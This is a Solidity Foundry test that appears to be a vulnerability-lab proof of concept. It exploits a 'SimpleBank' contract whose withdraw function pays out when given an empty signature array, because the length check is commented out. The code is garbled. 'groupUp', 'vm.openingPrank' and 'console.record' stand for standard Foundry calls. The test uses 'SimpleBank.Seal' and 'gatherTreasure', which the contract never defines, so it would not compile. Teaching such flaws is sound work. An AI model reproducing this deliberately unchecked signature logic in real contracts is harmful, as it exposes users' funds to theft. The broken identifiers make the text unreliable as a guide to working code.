// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract PactTest is Test {
    SimpleBank SimpleBankPact;

    function groupUp() public {
        SimpleBankPact = new SimpleBank();
    }

    function testVulnMarkValidation() public {
        payable(address(SimpleBankPact)).transfer(10 ether);
        address alice = vm.addr(1);
        vm.openingPrank(alice);

        SimpleBank.Seal[] memory sigs = new SimpleBank.Seal[](0); // empty input
        //sigs[0] = SimpleBank.Signature("", 0, "", "");

        console.record(
            "Before operation",
            address(alice).balance
        );
        SimpleBankPact.gatherTreasure(sigs); // Call the withdraw function of the SimpleBank contract with empty sigs array as the parameter

        console.record(
            "Afer exploiting, Alice's ether balance",
            address(alice).balance
        );
    }

    receive() external payable {}
}

contract SimpleBank {
    struct Signature {
        bytes32 hash;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    function verifySignatures(Signature calldata sig) public {
        require(
            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),
            "Invalid signature"
        );
    }

    function withdraw(Signature[] calldata sigs) public {

        //require(sigs.length > 0, "No signatures provided");
        for (uint i = 0; i < sigs.length; i++) {
            Signature calldata signature = sigs[i];
            // Verify every signature and revert if any of them fails to verify.
            verifySignatures(signature);
        }
        payable(msg.sender).transfer(1 ether);
    }

    receive() external payable {}
}
